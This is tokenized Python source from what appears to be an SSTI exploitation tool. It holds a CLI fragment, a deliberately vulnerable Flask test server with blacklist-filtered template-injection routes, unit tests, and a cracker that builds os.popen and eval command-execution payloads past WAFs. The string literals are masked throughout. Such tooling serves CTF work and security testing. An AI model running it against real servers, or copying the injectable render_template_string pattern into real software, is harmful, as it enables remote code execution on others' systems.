( request_pattern ) : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> logger . warning ( "<STR_LIT>" ) <EOL> request_pattern = fix_tail ( request_pattern ) <EOL> time . sleep ( <NUM_LIT> ) <EOL> if not raw and not check_line_break ( request_pattern ) : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> logger . warning ( "<STR_LIT>" ) <EOL> request_pattern = fix_line_break ( request_pattern ) <EOL> time . sleep ( <NUM_LIT> ) <EOL> requester = TCPRequester ( <EOL> host = host , port = port , use_ssl = ssl , retry_times = retry_times , interval = interval <EOL> ) <EOL> submitter = TCPSubmitter ( <EOL> requester = requester , <EOL> pattern = request_pattern , <EOL> toreplace = toreplace , <EOL> urlencode_payload = urlencode_payload , <EOL> ) <EOL> if tamper_cmd : <EOL> tamperer = shell_tamperer ( tamper_cmd ) <EOL> submitter . add_tamperer ( tamperer ) <EOL> full_payload_gen = do_crack_request_pre ( <EOL> submitter = submitter , <EOL> detect_mode = detect_mode , <EOL> replaced_keyword_strategy = replaced_keyword_strategy , <EOL> environment = environment , <EOL> ) <EOL> if not full_payload_gen : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> raise RunFailed ( ) <EOL> do_crack ( full_payload_gen , submitter , exec_cmd ) <EOL> @ main . command ( ) <EOL> @ click . option ( <EOL> "<STR_LIT>" , "<STR_LIT>" , default = "<STR_LIT>" , help = "<STR_LIT>" <EOL> ) <EOL> @ click . option ( "<STR_LIT>" , "<STR_LIT>" , default = <NUM_LIT> , help = "<STR_LIT>" ) <EOL> @ click . option ( <EOL> "<STR_LIT>" , default = True , help = "<STR_LIT>" <EOL> ) <EOL> def webui ( host , port , open_browser ) : <EOL> webui_main ( host , port , open_browser ) <EOL> if __name__ == "<STR_LIT>" : <EOL> main ( ) <EOL> </s>
<s> import random <EOL> import gc <EOL> from flask import Flask , request , render_template_string <EOL> from jinja2 import Template <EOL> app = Flask ( __name__ ) <EOL> blacklist = [ <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> def waf_words ( s ) : <EOL> return [ word for word in blacklist if word in s ] <EOL> def waf_pass ( s ) : <EOL> return waf_words ( s ) == [ ] <EOL> def lengthlimit1_waf_pass ( s ) : <EOL> if len ( s ) > <NUM_LIT> : <EOL> return False <EOL> blacklist = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> for ban in blacklist : <EOL> if ban in s : <EOL> return False <EOL> return True <EOL> def lengthlimit2_waf_pass ( inp ) : <EOL> blacklist = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> for b in blacklist : <EOL> if b in inp : <EOL> return False <EOL> if len ( inp ) <= <NUM_LIT> : <EOL> return True <EOL> if len ( inp ) > <NUM_LIT> : <EOL> return False <EOL> @ app . after_request <EOL> def garbasecollect ( resp ) : <EOL> if random . randint ( <NUM_LIT> , <NUM_LIT> ) == <NUM_LIT> : <EOL> gc . collect ( <NUM_LIT> ) <EOL> return resp <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def index ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> template = . format ( <EOL> name <EOL> ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def nonrespond ( ) : <EOL> template = "<STR_LIT>" <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def verifyheader ( ) : <EOL> user_agent = request . headers . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> custom_key = request . headers . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> cookie_data = request . cookies . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if "<STR_LIT>" not in user_agent : <EOL> return "<STR_LIT>" <EOL> if "<STR_LIT>" not in custom_key : <EOL> return "<STR_LIT>" <EOL> if "<STR_LIT>" not in cookie_data : <EOL> return "<STR_LIT>" <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> template = "<STR_LIT>" . format ( name ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> def crackpath ( name ) : <EOL> return render_template_string ( "<STR_LIT>" . format ( name ) ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def scan_burstkeywords ( ) : <EOL> name = request . args . get ( "<STR_LIT>" ) <EOL> if not name : <EOL> return "<STR_LIT>" <EOL> if not waf_pass ( name ) : <EOL> return "<STR_LIT>" <EOL> template = "<STR_LIT>" . format ( name ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def static_waf ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if not waf_pass ( name ) : <EOL> return "<STR_LIT>" <EOL> template = "<STR_LIT>" . format ( name ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" ] ) <EOL> def static_waf2 ( ) : <EOL> url_black_list = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> black_list = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> url = request . url <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if any ( w in url for w in url_black_list ) or any ( w in name for w in black_list ) : <EOL> return "<STR_LIT>" <EOL> return render_template_string ( "<STR_LIT>" . format ( name ) ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def dynamic_waf ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if not waf_pass ( name ) : <EOL> return waf_words ( name ) [ <NUM_LIT> ] <EOL> template = "<STR_LIT>" . format ( name ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def weird_waf ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if not waf_pass ( name ) and len ( name ) < <NUM_LIT> and random . random ( ) < <NUM_LIT> : <EOL> return "<STR_LIT>" <EOL> template = "<STR_LIT>" . format ( name ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def reversed_waf ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) [ : : - <NUM_LIT> ] <EOL> if not waf_pass ( name ) : <EOL> return "<STR_LIT>" <EOL> template = ( <EOL> "<STR_LIT>" . format ( name ) <EOL> + <EOL> ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def lengthlimit1_waf ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if not lengthlimit1_waf_pass ( name ) : <EOL> return "<STR_LIT>" <EOL> template = "<STR_LIT>" . format ( name ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def lengthlimit2_waf ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if not lengthlimit2_waf_pass ( name ) : <EOL> return "<STR_LIT>" <EOL> template = "<STR_LIT>" . format ( name ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def replace_waf ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> words = waf_words ( name ) <EOL> for word in words : <EOL> if len ( word ) >= <NUM_LIT> : <EOL> name = name . replace ( word , "<STR_LIT>" ) <EOL> template = "<STR_LIT>" . format ( name ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def replace_waf2 ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> words = waf_words ( name ) <EOL> for word in words : <EOL> if len ( word ) >= <NUM_LIT> : <EOL> name = name . replace ( word , "<STR_LIT>" ) <EOL> template = "<STR_LIT>" . format ( name ) <EOL> return render_template_string ( template ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" , "<STR_LIT>" ] ) <EOL> def jinja_env_waf ( ) : <EOL> name = request . args . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if not waf_pass ( name ) : <EOL> return "<STR_LIT>" <EOL> template = Template ( "<STR_LIT>" . format ( name ) ) <EOL> return template . render ( ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> def crackpath_extra ( name ) : <EOL> isdebug = request . args . get ( "<STR_LIT>" ) is not None <EOL> if isdebug : <EOL> return render_template_string ( "<STR_LIT>" . format ( name ) ) <EOL> return "<STR_LIT>" <EOL> if __name__ == "<STR_LIT>" : <EOL> app . run ( host = "<STR_LIT>" , port = <NUM_LIT> ) <EOL> </s>
<s> import logging <EOL> import sys <EOL> sys . path . append ( "<STR_LIT>" ) <EOL> import unittest <EOL> import os <EOL> import click <EOL> from fenjing import cli , waf_func_gen , options <EOL> import tempfile <EOL> SLEEP_INTERVAL = float ( os . environ . get ( "<STR_LIT>" , <NUM_LIT> ) ) <EOL> VULUNSERVER_ADDR = os . environ . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> waf_func_gen . logger . setLevel ( logging . ERROR ) <EOL> TEST_REQUEST = <EOL> class TestCLI ( unittest . TestCase ) : <EOL> def crack_test ( self , params ) : <EOL> ctx = click . Context ( cli . crack ) <EOL> ctx . params = { <EOL> param . name : param . default <EOL> for param in cli . crack . get_params ( ctx ) <EOL> if param . name != "<STR_LIT>" <EOL> } <EOL> ctx . params . update ( params ) <EOL> cli . crack . invoke ( ctx ) <EOL> def crack_path_test ( self , params ) : <EOL> ctx = click . Context ( cli . crack_path ) <EOL> ctx . params = { <EOL> param . name : param . default <EOL> for param in cli . crack_path . get_params ( ctx ) <EOL> if param . name != "<STR_LIT>" <EOL> } <EOL> ctx . params . update ( params ) <EOL> cli . crack_path . invoke ( ctx ) <EOL> def scan_test ( self , params ) : <EOL> ctx = click . Context ( cli . scan ) <EOL> ctx . params = { <EOL> param . name : param . default <EOL> for param in cli . scan . get_params ( ctx ) <EOL> if param . name != "<STR_LIT>" <EOL> } <EOL> ctx . params . update ( params ) <EOL> cli . scan . invoke ( ctx ) <EOL> def crack_request_test ( self , params ) : <EOL> ctx = click . Context ( cli . crack_request ) <EOL> ctx . params = { <EOL> param . name : param . default <EOL> for param in cli . crack_request . get_params ( ctx ) <EOL> if param . name != "<STR_LIT>" <EOL> } <EOL> ctx . params . update ( params ) <EOL> cli . crack_request . invoke ( ctx ) <EOL> def test_crack_basic ( self ) : <EOL> for uri in [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] : <EOL> self . crack_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + uri , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> } <EOL> ) <EOL> def test_crack_notexist ( self ) : <EOL> try : <EOL> self . crack_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> except cli . RunFailed : <EOL> return <EOL> else : <EOL> assert False <EOL> def test_crack_nonrespond ( self ) : <EOL> try : <EOL> self . crack_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> except cli . RunFailed : <EOL> return <EOL> else : <EOL> assert False <EOL> def test_crack_ua ( self ) : <EOL> self . crack_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : [ "<STR_LIT>" ] , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> def test_crack_fast ( self ) : <EOL> self . crack_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> def test_crack_eval_args ( self ) : <EOL> self . crack_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : True , <EOL> "<STR_LIT>" : options . TemplateEnvironment . FLASK <EOL> } <EOL> ) <EOL> def test_crack_tamperer ( self ) : <EOL> self . crack_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> def test_crack_path_basic ( self ) : <EOL> self . crack_path_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> def test_crack_path_tamperer ( self ) : <EOL> self . crack_path_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> ) <EOL> def test_crack_path_extra ( self ) : <EOL> self . crack_path_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> def test_scan_basic ( self ) : <EOL> self . scan_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> def test_scan_burstparam ( self ) : <EOL> self . scan_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> def test_scan_nonrespond ( self ) : <EOL> try : <EOL> self . scan_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> except cli . RunFailed : <EOL> pass <EOL> else : <EOL> assert False <EOL> def test_scan_tamperer ( self ) : <EOL> self . scan_test ( <EOL> { <EOL> "<STR_LIT>" : VULUNSERVER_ADDR + "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> ) <EOL> def test_crack_request_basic ( self ) : <EOL> protocol , sep , addr = VULUNSERVER_ADDR . partition ( "<STR_LIT>" ) <EOL> host , sep , port = addr . partition ( "<STR_LIT>" ) <EOL> temp_file = tempfile . NamedTemporaryFile ( ) <EOL> temp_file_path = temp_file . name <EOL> with open ( temp_file_path , '<STR_LIT>' ) as file : <EOL> file . write ( TEST_REQUEST ) <EOL> self . crack_request_test ( <EOL> { <EOL> "<STR_LIT>" : host , <EOL> "<STR_LIT>" : int ( port ) , <EOL> "<STR_LIT>" : temp_file_path , <EOL> "<STR_LIT>" : protocol == "<STR_LIT>" , <EOL> "<STR_LIT>" : SLEEP_INTERVAL , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> ) <EOL> </s>
<s> import functools <EOL> import logging <EOL> import random <EOL> import re <EOL> import sys <EOL> import time <EOL> from collections import namedtuple <EOL> from string import ascii_lowercase <EOL> from . payload_gen import TargetAndSubTargets , find_bad_exprs <EOL> from . requester import HTTPRequester <EOL> from . form import random_fill <EOL> from . submitter import FormSubmitter , RequestSubmitter , Submitter <EOL> from . colorize import colored <EOL> from . const import ( <EOL> PythonEnvironment , <EOL> AutoFix500Code , <EOL> ATTRIBUTE , <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> STRING , <EOL> CONFIG , <EOL> EVAL , <EOL> OS_POPEN_READ , <EOL> FLASK_CONTEXT_VAR , <EOL> ) <EOL> from . waf_func_gen import WafFuncGen <EOL> from . full_payload_gen import FullPayloadGen <EOL> from . context_vars import ContextVariableManager <EOL> from . options import Options <EOL> if sys . version_info >= ( <NUM_LIT> , <NUM_LIT> ) : <EOL> from typing import Union , Callable , Dict , Tuple <EOL> else : <EOL> from typing_extensions import Union , Callable , Dict , Tuple , Literal <EOL> logger = logging . getLogger ( "<STR_LIT>" ) <EOL> Result = namedtuple ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> def guess_python_version ( url : str , requester : HTTPRequester ) -> PythonEnvironment : <EOL> resp = requester . request ( method = "<STR_LIT>" , url = url ) <EOL> if resp is None : <EOL> return PythonEnvironment . UNKNOWN <EOL> version_regexp = re . search ( r"<STR_LIT>" , resp . headers . get ( "<STR_LIT>" , "<STR_LIT>" ) ) <EOL> if not version_regexp : <EOL> return PythonEnvironment . UNKNOWN <EOL> result = ( <EOL> PythonEnvironment . PYTHON3 <EOL> if version_regexp . group ( <NUM_LIT> ) == "<STR_LIT>" <EOL> else PythonEnvironment . PYTHON2 <EOL> ) <EOL> logger . info ( "<STR_LIT>" , colored ( "<STR_LIT>" , result . value , bold = True ) ) <EOL> return result <EOL> class EvalArgsModePayloadGen : <EOL> def __init__ ( self , will_print ) : <EOL> self . will_print = will_print <EOL> def generate ( self , gen_type , * args ) : <EOL> if gen_type == OS_POPEN_READ : <EOL> return f"<STR_LIT>" , self . will_print <EOL> elif gen_type == EVAL : <EOL> req = args [ <NUM_LIT> ] <EOL> assert ( <EOL> req [ <NUM_LIT> ] == STRING <EOL> ) , "<STR_LIT>" + repr ( req ) <EOL> return f"<STR_LIT>" , self . will_print <EOL> elif gen_type == CONFIG : <EOL> return ( <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" , <EOL> self . will_print , <EOL> ) <EOL> return None , None <EOL> class Cracker : <EOL> test_cmd = "<STR_LIT>" <EOL> test_eval = "<STR_LIT>" <EOL> test_result = "<STR_LIT>" <EOL> def __init__ ( <EOL> self , <EOL> submitter : Submitter , <EOL> callback : Union [ Callable [ [ str , Dict ] , None ] , None ] = None , <EOL> options : Union [ Options , None ] = None , <EOL> ) : <EOL> self . options = options if options else Options ( ) <EOL> self . subm = submitter <EOL> self . _callback : Callable [ [ str , Dict ] , None ] = ( <EOL> callback if callback else ( lambda x , y : None ) <EOL> ) <EOL> self . waf_func_gen = WafFuncGen ( submitter , callback = callback , options = options ) <EOL> @ property <EOL> def callback ( self ) : <EOL> return self . _callback <EOL> @ callback . setter <EOL> def callback ( self , callback ) : <EOL> self . _callback = callback <EOL> self . waf_func_gen . callback = callback <EOL> def test_payload ( self , payload : str , will_print : bool ) -> str : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> ) <EOL> result = self . subm . submit ( payload ) <EOL> assert result is not None <EOL> status_code , text = result <EOL> if status_code == <NUM_LIT> : <EOL> return "<STR_LIT>" <EOL> return ( <EOL> "<STR_LIT>" if self . test_result in text or not will_print else "<STR_LIT>" <EOL> ) <EOL> def test_payload_eval_args ( self , payload : str , subm : Submitter ) -> bool : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> ) <EOL> result = subm . submit ( payload ) <EOL> assert result is not None <EOL> _ , text = result <EOL> return self . test_result in text <EOL> def has_respond ( self ) -> bool : <EOL> for _ in range ( <NUM_LIT> ) : <EOL> content = random . choice ( ascii_lowercase ) * <NUM_LIT> <EOL> resp = self . subm . submit ( content ) <EOL> assert resp is not None , "<STR_LIT>" <EOL> if content in resp . text : <EOL> return True <EOL> return False <EOL> def crack_with_waf ( <EOL> self , waf_func , waf_expr_func = None <EOL> ) -> Union [ Tuple [ FullPayloadGen , bool , str , TargetAndSubTargets ] , None ] : <EOL> full_payload_gen = FullPayloadGen ( <EOL> waf_func , <EOL> callback = None , <EOL> options = self . options , <EOL> waf_expr_func = waf_expr_func , <EOL> ) <EOL> result = full_payload_gen . generate_with_tree ( OS_POPEN_READ , self . test_cmd ) <EOL> if result is None : <EOL> return None <EOL> payload , will_print , tree = result <EOL> test_result = self . test_payload ( payload , will_print ) <EOL> return full_payload_gen , will_print , test_result , tree <EOL> def log_with_result ( self , will_print : bool , test_result : str ) : <EOL> if will_print : <EOL> if test_result == "<STR_LIT>" : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> ) <EOL> elif test_result == "<STR_LIT>" : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> ) <EOL> else : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> ) <EOL> else : <EOL> if test_result == "<STR_LIT>" : <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) , <EOL> ) <EOL> else : <EOL> logger . info ( <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" , <EOL> ) <EOL> def expr_waf_not500 ( <EOL> self , tree , outer_pattern , context_vars : ContextVariableManager <EOL> ) : <EOL> def is_expr_bad ( expr ) : <EOL> payload = context_vars . get_payload ( <EOL> context_vars . get_context ( ) <EOL> ) + outer_pattern . replace ( "<STR_LIT>" , expr ) <EOL> result = self . subm . submit ( payload ) <EOL> assert result is not None <EOL> status_code , _ = result <EOL> logger . info ( <EOL> "<STR_LIT>" , <EOL> colored ( "<STR_LIT>" , payload ) , <EOL> colored ( "<STR_LIT>" , status_code ) , <EOL> ) <EOL> return status_code == <NUM_LIT> <EOL> exprs = [ payload for payload , _ in find_bad_exprs ( tree , is_expr_bad ) ] <EOL> @ functools . lru_cache ( <NUM_LIT> ) <EOL> def new_waf ( s ) : <EOL> return all ( expr not in s for expr in exprs ) and not is_expr_bad ( s ) <EOL> return new_waf <EOL> def crack ( self ) -> Union [ FullPayloadGen , None ] : <EOL> logger . info ( "<STR_LIT>" ) <EOL> waf_func = self . waf_func_gen . generate ( ) <EOL> result = self . crack_with_waf ( waf_func ) <EOL> if not result : <EOL> return None <EOL> full_payload_gen , will_print , test_result , tree = result <EOL> assert ( <EOL> full_payload_gen . context_vars is not None <EOL> ) , "<STR_LIT>" <EOL> self . log_with_result ( will_print , test_result ) <EOL> if ( <EOL> test_result == "<STR_LIT>" <EOL> and self . options . autofix_500 == AutoFix500Code . ENABLED <EOL> ) : <EOL> logger . info ( colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) ) <EOL> logger . info ( <EOL> colored ( <EOL> "<STR_LIT>" , "<STR_LIT>" , bold = True <EOL> ) <EOL> ) <EOL> logger . info ( <EOL> colored ( "<STR_LIT>" , "<STR_LIT>" , bold = True ) <EOL> ) <EOL> time . sleep ( <NUM_LIT> ) <EOL> waf_expr_func = self . expr_waf_not500 ( <EOL> tree , full_payload_gen . outer_pattern , full_payload_gen . context_vars <EOL> ) <EOL> result = self . crack_with_waf ( waf_func , waf_expr_func = waf_expr_func ) <EOL> if result : <EOL> full_payload_gen , will_print , test_result , tree = result <EOL> if test_result == "<STR_LIT>" : <EOL> logger . info ( "<STR_LIT>" ) <EOL> self . log_with_result ( will_print , test_result ) <EOL> return full_payload_gen <EOL> def crack_eval_args ( self ) -> Union [ Tuple [ Submitter , EvalArgsModePayloadGen ] , None ] : <EOL> args_target_field = "<STR_LIT>" <EOL> logger . info ( "<STR_LIT>" ) <EOL> assert isinstance ( <EOL> self . subm , FormSubmitter <EOL> ) , "<STR_LIT>" <EOL> waf_func = self . waf_func_gen . generate ( ) <EOL> full_payload_gen = FullPayloadGen ( waf_func , callback = None , options = self . options ) <EOL> payload , will_print = full_payload_gen . generate ( <EOL> EVAL , <EOL> ( <EOL> CHAINED_ATTRIBUTE_ITEM , <EOL> ( FLASK_CONTEXT_VAR , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , "<STR_LIT>" ) , <EOL> ( ATTRIBUTE , args_target_field ) , <EOL> ) , <EOL> ) <EOL> if payload is None 